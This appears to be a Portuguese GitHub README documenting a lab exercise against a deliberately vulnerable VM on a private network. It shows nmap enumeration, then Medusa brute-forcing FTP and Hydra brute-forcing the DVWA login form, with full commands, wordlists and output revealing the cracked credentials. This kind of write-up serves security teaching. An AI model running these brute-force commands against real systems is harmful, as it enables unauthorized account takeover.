# brute-force
medusa - brute force = 
Voltada para ataque de rede com foco altíssima velocidade e estabilidade.


<img width="370" height="25" alt="image" src="https://github.com/user-attachments/assets/9ab74f77-5500-4c54-be21-44e8526d3580" />
deixando ela em atividade .. 
##Pinga pra saber se esta na mesma rede , a maquina que deseja invadir precisa esta na mesma rede>

ping -c 3 192.168.56.3 *mandando somente 3 pacotes para o numero de deseja conexao*
┌──(kali㉿kali)-[~]
└─$ ping -c 3  192.168.56.3
PING 192.168.56.3 (192.168.56.3) 56(84) bytes of data.
64 bytes from 192.168.56.3: icmp_seq=1 ttl=64 time=0.336 ms
64 bytes from 192.168.56.3: icmp_seq=2 ttl=64 time=0.579 ms
64 bytes from 192.168.56.3: icmp_seq=3 ttl=64 time=0.738 ms

--- 192.168.56.3 ping statistics ---
3 packets transmitted, 3 received, 0% packet loss, time 2050ms
rtt min/avg/max/mdev = 0.336/0.551/0.738/0.165 ms


##Auditoria foco ftp> **
1p - enumeraçao *desconbrir quais os serviços estao disponivel no sistema alvo* - nmap

comando no terminal> 
nmap -sV -p 21,22,80,445,139 192.168.56.3  
* scan da -sV eh a versao de serviso, -p e a seguencia de numeros são as portas principais, e por ultimo p ip alvo*

──(kali㉿kali)-[~]
└─$ nmap -sV -p 21,22,80,445,139 192.168.56.3
Starting Nmap 7.92 ( https://nmap.org ) at 2025-10-28 15:32 EDT
Nmap scan report for 192.168.56.3
Host is up (0.0016s latency).

PORT    STATE SERVICE     VERSION
21/tcp  open  ftp         vsftpd 2.3.4
22/tcp  open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
80/tcp  open  http        Apache httpd 2.2.8 ((Ubuntu) DAV/2)
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.70 seconds

confirmando a porta do ftp aberta...

##criando possivel lista de usuario e senhas comuns >**

comando no terminal>
echo -e "user\nmsfadmin\nadmin\nroot" > users.txt
echo -e "123456\npassword\nqwerty\nmsfadmin" > pass.txt

kali㉿kali)-[~]
└─$ echo -e "123456\npassword\nqwerty\nmsfadmin" > pass.txt    
                                                                             
┌──(kali㉿kali)-[~]
└─$ echo -e "user\nmsfadmin\nadmin\nroot" > users.txt


criando as listas...

## força bruta ** 
comando terminal>
medusa -h 192.168.56.3 -U users.txt -P pass.txt -M ftp -t 6


┌──(kali㉿kali)-[~]
└─$ medusa -h 192.168.56.3 -U users.txt -P pass.txt -M ftp -t 6
Medusa v2.2 [http://www.foofus.net] (C) JoMo-Kun / Foofus Networks <jmk@foofus.net>

ACCOUNT CHECK: [ftp] Host: 192.168.56.3 (1 of 1, 0 complete) User: user (1 of 4, 1 complete) Password: 123456 (1 of 4 complete)
ACCOUNT CHECK: [ftp] Host: 192.168.56.3 (1 of 1, 0 complete) User: user (1 of 4, 1 complete) Password: password (2 of 4 complete)
ACCOUNT CHECK: [ftp] Host: 192.168.56.3 (1 of 1, 0 complete) User: user (1 of 4, 1 complete) Password: qwerty (3 of 4 complete)
ACCOUNT CHECK: [ftp] Host: 192.168.56.3 (1 of 1, 0 complete) User: user (1 of 4, 1 complete) Password: msfadmin (4 of 4 complete)
ACCOUNT CHECK: [ftp] Host: 192.168.56.3 (1 of 1, 0 complete) User: msfadmin (2 of 4, 1 complete) Password: 123456 (1 of 4 complete)
ACCOUNT CHECK: [ftp] Host: 192.168.56.3 (1 of 1, 0 complete) User: msfadmin (2 of 4, 1 complete) Password: password (2 of 4 complete)
ACCOUNT CHECK: [ftp] Host: 192.168.56.3 (1 of 1, 0 complete) User: msfadmin (2 of 4, 2 complete) Password: msfadmin (3 of 4 complete)
ACCOUNT FOUND: [ftp] Host: 192.168.56.3 User: msfadmin Password: msfadmin [SUCCESS]
ACCOUNT CHECK: [ftp] Host: 192.168.56.3 (1 of 1, 0 complete) User: admin (3 of 4, 3 complete) Password: 123456 (1 of 4 complete)
ACCOUNT CHECK: [ftp] Host: 192.168.56.3 (1 of 1, 0 complete) User: root (4 of 4, 3 complete) Password: 123456 (1 of 4 complete)
ACCOUNT CHECK: [ftp] Host: 192.168.56.3 (1 of 1, 0 complete) User: msfadmin (2 of 4, 3 complete) Password: qwerty (4 of 4 complete)
ACCOUNT CHECK: [ftp] Host: 192.168.56.3 (1 of 1, 0 complete) User: root (4 of 4, 3 complete) Password: password (2 of 4 complete)
ACCOUNT CHECK: [ftp] Host: 192.168.56.3 (1 of 1, 0 complete) User: admin (3 of 4, 5 complete) Password: password (2 of 4 complete)
ACCOUNT CHECK: [ftp] Host: 192.168.56.3 (1 of 1, 0 complete) User: admin (3 of 4, 5 complete) Password: qwerty (3 of 4 complete)
ACCOUNT CHECK: [ftp] Host: 192.168.56.3 (1 of 1, 0 complete) User: admin (3 of 4, 5 complete) Password: msfadmin (4 of 4 complete)
ACCOUNT CHECK: [ftp] Host: 192.168.56.3 (1 of 1, 0 complete) User: root (4 of 4, 5 complete) Password: qwerty (3 of 4 complete)
ACCOUNT CHECK: [ftp] Host: 192.168.56.3 (1 of 1, 0 complete) User: root (4 of 4, 5 complete) Password: msfadmin (4 of 4 complete)
                                                                                                                                                                       




aparecerar se encontrou ou não.. Se encontrou aparece com sucesso>

##aceder**
comando no terminal>
ftp 192.168.56.3
name> msfadmin
pass> msfadmin

┌──(kali㉿kali)-[~]
└─$ ftp 192.168.56.3
Connected to 192.168.56.3.
220 (vsFTPd 2.3.4)
Name (192.168.56.3:kali): msfadmin     
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> 

ataque final;

<img width="317" height="287" alt="image" src="https://github.com/user-attachments/assets/21ff371b-92ba-4920-9974-e2d2d74bae3e" />
::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::

## Formulario web
 no navegador > 192.168.56.3/dvwa/login.php
 
simular o login para ver como responde, e ativar o modo desenvolvedor da pagina f12
<img width="1366" height="662" alt="kali" src="https://github.com/user-attachments/assets/8845f9ee-969d-4d1c-b7be-081c3ac5a076" />

comando no terminal:>

hydra -L users.txt -P pass.txt 192.168.56.3 http-form-post \
"/dvwa/login.php:username=^USER^&password=^PASS^&Login=Login:Login failed" -t 16

Hydra é amplamente usado para http-form-post e geralmente lida melhor com esse cenário. Exemplo (ajusta FAIL_STRING conforme a página real). A parte depois de http-form-post tem a sintaxe: path:POST_data:failure_string.

┌──(kali㉿kali)-[~]
└─$ hydra -L users.txt -P pass.txt 192.168.56.3 http-form-post \
"/dvwa/login.php:username=^USER^&password=^PASS^&Login=Login:Login failed" -t 16
Hydra v9.3 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-10-28 16:16:07
[DATA] max 16 tasks per 1 server, overall 16 tasks, 16 login tries (l:4/p:4), ~1 try per task
[DATA] attacking http-post-form://192.168.56.3:80/dvwa/login.php:username=^USER^&password=^PASS^&Login=Login:Login failed
[80][http-post-form] host: 192.168.56.3   login: admin   password: password
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-10-28 16:16:10


se tiver sucess foi... ex [80][http-post-form] host: 192.168.56.3   login: admin   password: password
no navegador= 

colocar o use e pss que apareceu> 
<img width="1366" height="662" alt="fim" src="https://github.com/user-attachments/assets/43f4c4d4-872d-4d9f-99f3-1b848319daf2" />



##fim
